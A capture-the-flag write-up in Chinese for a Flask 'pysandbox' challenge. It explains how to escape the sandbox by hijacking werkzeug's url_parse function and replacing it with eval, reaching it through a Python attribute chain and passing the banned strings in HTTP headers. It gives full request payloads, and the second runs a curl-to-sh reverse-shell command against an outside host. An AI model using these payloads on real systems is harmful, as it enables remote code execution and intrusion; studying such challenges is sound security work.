# pysandbox

## 非预期
通过app.static_folder 动态更改静态文件目录，将静态文件目录设为根目录，从而任意文件读,这也是pysandbox的大部分做法
## 预期
预期就是pysandbox2 必须RCE

本题的主要思路就是劫持函数，通过替换某一个函数为eval system等，然后变量外部可控，即可RCE
看了一下大家RCE的做法都不相同，就只贴一下自己当时挖到的方法了

首先要找到一个合适的函数，满足参数可控，最终找到werkzeug.urls.url_parse这个函数，参数就是HTTP包的路径

比如
```
GET /index.php HTTP/1.1
Host: xxxxxxxxxxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
```
参数就是 '/index.php'
然后是劫持，我们无法输入任何括号和空格，所以无法直接import werkzeug
需要通过一个继承链关系来找到werkzeug这个类
直接拿出tokyowestern 2018年 shrine的找继承链脚本（请看getexp.py)
访问一下，即可在1.txt最下面看到继承链
最终找到是
`request.__class__._get_current_object.__globals__['__loader__'].__class__.__weakref__.__objclass__.contents.__globals__['__loader__'].exec_module.__globals__['_bootstrap_external']._bootstrap.sys.modules['werkzeug.urls']
`
但是发现我们不能输入任何引号，这个考点也考多了，可以通过request的属性进行bypass
最终找到一些外部可控的request属性
request.host
request.content_md5
request.content_encoding
所以请求1
```
POST / HTTP/1.1
Host: __loader__
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: experimentation_subject_id=IjA3OWUxNDU0LTdiNmItNDhmZS05N2VmLWYyY2UyM2RmZDEyMyI%3D--a3effd8812fc6133bcea4317b16268364ab67abb; lang=zh-CN
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-MD5: _bootstrap_external
Content-Encoding: werkzeug.urls
Content-Type: application/x-www-form-urlencoded
Content-Length: 246

cmd=request.__class__._get_current_object.__globals__[request.host].__class__.__weakref__.__objclass__.contents.__globals__[request.host].exec_module.__globals__[request.content_md5]._bootstrap.sys.modules[request.content_encoding].url_parse=eval
```
然后url_parse函数就变成了eval
然后访问第二个请求

```
POST __import__('os').system('curl${IFS}https://shell.now.sh/8.8.8.8:1003|sh') HTTP/1.1
Host: __loader__
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: experimentation_subject_id=IjA3OWUxNDU0LTdiNmItNDhmZS05N2VmLWYyY2UyM2RmZDEyMyI%3D--a3effd8812fc6133bcea4317b16268364ab67abb; lang=zh-CN
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-MD5: _bootstrap_external
Content-Encoding: werkzeug.urls
Content-Type: application/x-www-form-urlencoded
Content-Length: 246

cmd=request.__class__._get_current_object.__globals__[request.host].__class__.__weakref__.__objclass__.contents.__globals__[request.host].exec_module.__globals__[request.content_md5]._bootstrap.sys.modules[request.content_encoding].url_parse=eval
```
shell就弹回来了